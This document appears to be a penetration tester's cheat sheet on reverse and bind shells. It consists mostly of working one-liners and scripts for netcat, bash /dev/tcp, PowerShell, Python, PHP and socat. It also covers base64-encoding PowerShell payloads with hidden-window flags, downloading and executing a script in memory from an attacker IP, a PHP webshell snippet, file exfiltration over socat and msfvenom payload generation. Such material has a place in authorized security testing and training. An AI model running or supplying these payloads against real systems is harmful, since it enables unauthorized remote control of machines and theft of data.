# All about reverse shells

* Try always using ports: 80 or 443 if open

# Serving

To upload malicious reverse shell code it is necessary to host this code

Try using ports 80 and 443 for this reason.

```
python -m SimpleHTTPServer 443
python3 -m http.server 443

php -S 0.0.0.0:443

ruby -run -e httpd . -p 443

busybox httpd -f -p 443
```

Refer for more to: https://blog.certcube.com/file-transfer-cheatsheet-for-pentesters/

# Bind Shells

## Powershell bind

```
#Uncomment and change the hardcoded port number (443) in the below line. Remove this help comment as well.

#$listener = [System.Net.Sockets.TcpListener]443;$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()
```

# Reverse shells

All of those methods assume that necessary programs like nc, python, php and etc are installed on target hosts.

* Firewall allow mostly outbound connections, that's why rever shell is so popular.
* You always need a listener to connect a rev shell to
`nc -lvnp <PORT>`
* by <PORT> selection try using ports 80, 443 because they are mostly not blocked by firewalls

## Netcat

* Necat: 
```
# Linux
nc <IP> <PORT> -e /bin/bash

# Windows
nc.exe <IP> <PORT> -e cmd.exe

```

## Bash

`bash -i >& /dev/tcp/ATTACKER-IP/ATTACKER-PORT 0>&1`

this one works everywhere `exec 5<>/dev/tcp/10.10.14.151/443;cat <&5 | while read line; do $line 2>&5 >&5; done`

### Bash wrapper

sometimes bash fails especially from webshell, so it can be wrapped to fix it

`bash -c "bash -i >& /dev/tcp/192.168.45.176/443 0>&1"`

## Powershell

### Encoded Powershell Execution

1. Create `shell_raw.ps1` with following contents

```powershell
#replace <IP_ATTACKER> with target ip, so it is going to look something like this: TCPClient('10.231.12.44',443)

# rev.ps1
$client = New-Object System.Net.Sockets.TCPClient('<IP_ATTACKER>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();

```

2. Encode contents of  `shell_raw.ps1`

```powershell
# using powershell 
$expression     = Get-Content -Path .\shell_raw.ps1
$commandBytes   = [System.Text.Encoding]::Unicode.GetBytes($expression)
$encodedCommand = [Convert]::ToBase64String($commandBytes)
echo $encodedCommand
$filePath = "encoded.ps1"

$encodedCommand | Out-File -FilePath $filePath  -Encoding ASCII


# or using python

import sys
import base64

with open(sys.argv[1], 'r') as file:
    payload = file.read()

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
3. Execute with powershell the output of $encodedCommand

str = "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad..."

Or execute in memory

`powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"`

## Python

* Python3: 

`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",ATTACKER-PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

and without subprocess

`python -c 'import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacking-ip",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.system("/bin/sh -i")'`

## PHP

```bash
php -r '$sock=fsockopen("ATTACKER-IP",ATTACKER-PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
(Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
```

* If possible to upload files, create reverse shell upload and start it using the script below

```php
<?php 

#shell_exec('wget http://192.168.119.207:4444');

echo "" .shell_exec('/tmp/rev.elf')."\n";

?>

# shell_exec can be replaced with other
eval
proc_open
exec
system
```


### PHP webshells

Nice collection here: https://github.com/JohnTroony/php-webshells

I TAKE ABSOLUTELY NO RESPONSIBILITY FOR ANY OF THOSE SHELLS. CHECK their CODE BEFORE USING!
THE ONLY SAFE SHELL is within kali linux webshells.

```
$ webshells
> webshells ~ Collection of webshells
/usr/share/webshells
├── asp
├── aspx
├── cfm
├── jsp
├── laudanum -> /usr/share/laudanum
├── perl
└── php

```

## Socat

* Socat is not well know but is super useful if able to launch
* Once launched socat can provide a fully interactive shell just like SSH

### socat reverse shell

```bash

#attacker
socat -d -d TCP4-LISTEN:443 STDOUT

#victim
socat TCP4:10.xxx.xxx.xxx:443 EXEC:/bin/bash
```

### Fully interactive bind shell

```bash
#On Victim with IP address 10.99.66.88 initiate a listener:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP4-LISTEN:3333,reuseaddr,fork,ignoreeof

#from attacker
socat file:`tty`,raw,echo=0 tcp:10.99.66.88:3333
```

### Socat file transfers

```bash

# sender: attacker on linux

sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt

# receiver: victim on windows
socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create

```

### Encrypted connection

1. Create self-signed cert in openssl

```bash
- req: initiate a new certificate signing request
- newkey: generate a new private key
- rsa:2048: use RSA encryption with a 2,048-bit key length.
- nodes: store the private key without passphrase protection
- keyout: save the key to a file
- x509: output a self-signed certificate instead of a certificate request
- days: set validity period in days
- out: save the certificate to a file

openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind.crt

#converting to .pem
cat bind.key bind.crt > bind.pem

# victim

sudo socat OPENSSL-LISTEN:443,cert=bind.pem,verify=0,fork EXEC:/bin/bash

# verify=0 to disable certificate verification

# attacker connects
socat - OPENSSL:10.xxx.xxx.xxx:443,verify=0

```


## Webshell

In Kali it is integrated:

`$ webshells`

After that you shall be placed into the directory with webshells

```
> webshells ~ Collection of webshells
/usr/share/webshells
├── asp
├── aspx
├── cfm
├── jsp
├── laudanum -> /usr/share/laudanum
├── perl
└── php

```

Here you have a rich selection of all possible shells.

## Reverse Shell bytecode generation with MSFVENOM

Use for any available payload.

`msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.xxx.xxx LPORT=443 -f python`

`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888`

# Shell Upgrade

* The bind/reverse shell is not always fully interactive but can be made using like that using Python trick:

1. Insert one those lines into victim CLI

<code> python -c 'import pty; pty.spawn("/bin/bash")' </code><br>
<code> python3 -c 'import pty;pty.spawn("/bin/bash")' </code>

## Getting fully working PTY

```
python -c 'import pty; pty.spawn("/bin/bash")'
^Z bg
stty -a
echo $TERM
stty raw -echo
fg
export TERM=...
stty rows xx columns yy
```

